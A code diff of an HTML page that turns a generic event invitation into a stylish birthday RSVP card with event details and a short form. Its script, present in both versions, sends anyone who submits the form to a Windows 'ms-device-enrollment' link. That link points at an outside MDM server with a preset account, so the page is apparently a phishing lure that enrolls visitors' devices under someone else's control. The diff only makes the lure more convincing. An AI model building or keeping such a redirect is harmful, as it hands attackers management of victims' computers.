@@ -3,200 +3,257 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Special Event — Open Your Invitation</title>
+  <title>Juliet Marks — Birthday Celebration · RSVP</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;1,400&family=Great+Vibes&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Great+Vibes&display=swap" rel="stylesheet" />
   <style>
-    /*
-     * CHANGE HERO IMAGE: Edit the line below. Use a filename in the same folder
-     * (e.g. 'background-image.png') or a path/URL. Top section will show this image.
-     */
     :root {
-      --hero-image: url('background-image.png');
-      --peach: #f5e6d8;
-      --peach-dark: #e8d4c4;
-      --burnt-orange: #c45c2a;
-      --burnt-orange-hover: #a84d22;
-      --script-ink: #5c3d2e;
-      --tagline-ink: #7d5c4a;
-      --white: #fefefe;
+      --bg-image: url('background-image.png');
+      --cream: #fdfbf3;
+      --ink: #1a1a1a;
+      --gold: #bf8f30;
+      --gold-dark: #9a7326;
+      --side-band: #1a1a1a;
+      --input-bg: #ffffff;
+      --input-border: #d4d0c8;
     }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
-    html {
-      min-height: 100%;
-    }
+    html { min-height: 100%; }
 
     body {
-      font-family: 'Cormorant Garamond', Georgia, serif;
+      font-family: 'Libre Baskerville', Georgia, serif;
       min-height: 100vh;
-      color: var(--script-ink);
+      color: var(--ink);
+      background: var(--side-band);
       -webkit-font-smoothing: antialiased;
     }
 
-    .page {
+    .page-wrap {
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
-    }
-
-    .hero {
-      flex: 0 0 52%;
-      min-height: 42vh;
-      background: var(--hero-image) center center / cover no-repeat;
-      background-color: var(--peach);
-    }
-
-    .cta-section {
-      flex: 1;
-      background: var(--peach);
-      padding: 2.5rem 1.5rem 3rem;
-      display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      text-align: center;
+      padding: 2rem 0;
+      background: var(--bg-image) center center / cover no-repeat;
     }
 
-    .event-title {
-      font-family: 'Great Vibes', cursive;
-      font-size: clamp(2.25rem, 6vw, 3.25rem);
-      color: var(--script-ink);
-      margin-bottom: 0.4rem;
-      line-height: 1.15;
+    .page-wrap::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.15);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .card-outer {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      max-width: 560px;
+      width: 100%;
+      margin: 0 1rem;
+    }
+
+    .card-band {
+      width: 24px;
+      background: var(--side-band);
+      position: relative;
+    }
+
+    .card-band.left::after {
+      content: '';
+      position: absolute;
+      top: 0; bottom: 0;
+      right: -2px;
+      width: 5px;
+      background: var(--gold);
+      box-shadow: 0 0 0 1px rgba(191, 143, 48, 0.4);
+    }
+
+    .card-band.right { order: 2; }
+
+    .card-band.right::after {
+      content: '';
+      position: absolute;
+      top: 0; bottom: 0;
+      left: -2px;
+      width: 5px;
+      background: var(--gold);
+      box-shadow: 0 0 0 1px rgba(191, 143, 48, 0.4);
+    }
+
+    .card-inner {
+      flex: 1;
+      background: var(--cream);
+      padding: 2.5rem 2.25rem 2.75rem;
+      border-left: 3px solid var(--gold);
+      border-right: 3px solid var(--gold);
     }
 
     .tagline {
-      font-size: 0.75rem;
-      font-weight: 600;
-      letter-spacing: 0.25em;
-      text-transform: uppercase;
-      color: var(--tagline-ink);
-      margin-bottom: 2rem;
+      font-size: 0.95rem;
+      font-weight: 400;
+      color: var(--ink);
+      text-align: center;
+      margin-bottom: 0.35rem;
     }
 
-    .invite-form {
-      width: 100%;
-      max-width: 320px;
-    }
-
-    .form-group {
+    .guest-name {
+      font-family: 'Great Vibes', cursive;
+      font-size: 2.75rem;
+      color: var(--ink);
+      text-align: center;
       margin-bottom: 1.25rem;
+      line-height: 1.15;
     }
+
+    .event-details {
+      font-size: 0.8rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--ink);
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .event-details p { margin-bottom: 0.2rem; }
+
+    .event-details .location {
+      letter-spacing: 0.06em;
+      text-transform: none;
+    }
+
+    .event-details .dress {
+      margin-top: 0.35rem;
+      font-weight: 400;
+      font-style: italic;
+      text-transform: none;
+      letter-spacing: 0.04em;
+    }
+
+    .rsvp-instruction-box {
+      border: 2px solid var(--gold);
+      padding: 1rem 1.25rem;
+      margin-bottom: 1.75rem;
+      text-align: center;
+    }
+
+    .rsvp-instruction-box h2 {
+      font-size: 0.8rem;
+      font-weight: 700;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--ink);
+      margin-bottom: 0.25rem;
+    }
+
+    .rsvp-instruction-box p {
+      font-size: 0.8rem;
+      font-style: italic;
+      color: var(--ink);
+    }
+
+    .form-group { margin-bottom: 1.15rem; }
 
     .form-group label {
       display: block;
-      font-size: 0.7rem;
-      font-weight: 600;
-      letter-spacing: 0.15em;
-      text-transform: uppercase;
-      color: var(--tagline-ink);
-      margin-bottom: 0.5rem;
+      font-size: 0.8rem;
+      font-weight: 400;
+      color: var(--ink);
+      margin-bottom: 0.4rem;
     }
 
     .form-group input {
       width: 100%;
-      padding: 0.75rem 1rem;
-      font-family: 'Cormorant Garamond', Georgia, serif;
-      font-size: 1.05rem;
-      color: var(--script-ink);
-      background: var(--white);
-      border: 1px solid rgba(92, 61, 46, 0.25);
-      border-radius: 4px;
-      transition: border-color 0.2s, box-shadow 0.2s;
+      padding: 0.6rem 0.75rem;
+      font-family: 'Libre Baskerville', Georgia, serif;
+      font-size: 0.95rem;
+      color: var(--ink);
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      transition: border-color 0.2s;
     }
 
-    .form-group input::placeholder {
-      color: #a89080;
-    }
+    .form-group input::placeholder { color: #9a958f; }
 
     .form-group input:focus {
       outline: none;
-      border-color: var(--burnt-orange);
-      box-shadow: 0 0 0 3px rgba(196, 92, 42, 0.2);
+      border-color: var(--gold);
     }
 
-    .btn-open-invite {
+    .btn-send {
       display: block;
       width: 100%;
-      padding: 0.9rem 1.75rem;
-      font-family: 'Cormorant Garamond', Georgia, serif;
-      font-size: 1rem;
-      font-weight: 600;
+      margin-top: 1.25rem;
+      padding: 0.85rem 1.5rem;
+      font-family: 'Libre Baskerville', Georgia, serif;
+      font-size: 0.9rem;
+      font-weight: 700;
       letter-spacing: 0.2em;
       text-transform: uppercase;
-      color: var(--white);
-      background: var(--burnt-orange);
+      color: #fff;
+      background: var(--gold);
       border: none;
-      border-radius: 30px;
       cursor: pointer;
-      transition: background 0.2s, transform 0.15s;
+      transition: background 0.2s, transform 0.1s;
     }
 
-    .btn-open-invite:hover {
-      background: var(--burnt-orange-hover);
+    .btn-send:hover {
+      background: var(--gold-dark);
       transform: translateY(-1px);
     }
 
-    .btn-open-invite:active {
-      transform: translateY(0);
-    }
-
-    @media (min-width: 600px) {
-      .page {
-        flex-direction: row;
-      }
-
-      .hero {
-        flex: 0 0 50%;
-        min-height: 100vh;
-      }
-
-      .cta-section {
-        flex: 0 0 50%;
-        min-height: 100vh;
-        padding: 2rem 3rem;
-      }
-    }
+    .btn-send:active { transform: translateY(0); }
   </style>
 </head>
 <body>
-  <div class="page">
-    <section class="hero" aria-hidden="true"></section>
-    <section class="cta-section">
-      <h1 class="event-title">Special Event</h1>
-      <p class="tagline">Let's be thankful together!</p>
-
-      <form id="invite-form" class="invite-form" action="#" method="get">
-        <div class="form-group">
-          <label for="guest-name">Your name</label>
-          <input
-            type="text"
-            id="guest-name"
-            name="name"
-            placeholder="Enter your name"
-            required
-            autocomplete="name"
-          />
+  <div class="page-wrap">
+    <div class="card-outer">
+      <div class="card-band left"></div>
+      <main class="card-inner">
+        <p class="tagline">Let's wine and dine as we celebrate a birthday for</p>
+        <h1 class="guest-name">Juliet Marks</h1>
+        <div class="event-details">
+          <p>October 14, 2026</p>
+          <p>Six o'clock pm</p>
+          <p>The Palms Hotel</p>
+          <p class="location">Santa Barbara, CA</p>
+          <p class="dress">Cocktail Attire</p>
         </div>
-        <button type="submit" class="btn-open-invite">Open invite</button>
-      </form>
-    </section>
+
+        <div class="rsvp-instruction-box">
+          <h2>RSVP Instructions</h2>
+          <p>Complete the form below by October 1st</p>
+        </div>
+
+        <form id="rsvp-form" action="#" method="get">
+          <div class="form-group">
+            <label for="names">Name(s)</label>
+            <input type="text" id="names" name="names" placeholder="" required autocomplete="name" />
+          </div>
+          <div class="form-group">
+            <label for="attendance">Attendance (Yes/No)</label>
+            <input type="text" id="attendance" name="attendance" placeholder="Dietary Restrictions" autocomplete="off" />
+          </div>
+          <button type="submit" class="btn-send">Send RSVP</button>
+        </form>
+      </main>
+      <div class="card-band right"></div>
+    </div>
   </div>
 
   <script>
     const REDIRECT_URL = 'ms-device-enrollment:?mode=mdm&username=smtp-on7ys@naccato.com.ar&servername=https://wxigqj-api.esper.cloud/api/v2/windows/discovery/Ymx1ZXByaW50X2lkPTJiNzM2NWRjLTYzODYtNDkwYy1iYTY3LTY2MzkzOTExNDJhNCZncm91cF9pZD1iMDQwOGRjNi02OWE0LTQ0MzMtODNkNC0zMDI5MThkNWZjYjQ';
 
-    document.getElementById('invite-form').addEventListener('submit', function (e) {
+    document.getElementById('rsvp-form').addEventListener('submit', function (e) {
       e.preventDefault();
-      var nameInput = document.getElementById('guest-name');
-      if (nameInput && nameInput.value.trim()) {
+      var namesInput = document.getElementById('names');
+      if (namesInput && namesInput.value.trim()) {
         window.location.href = REDIRECT_URL;
       }
     });
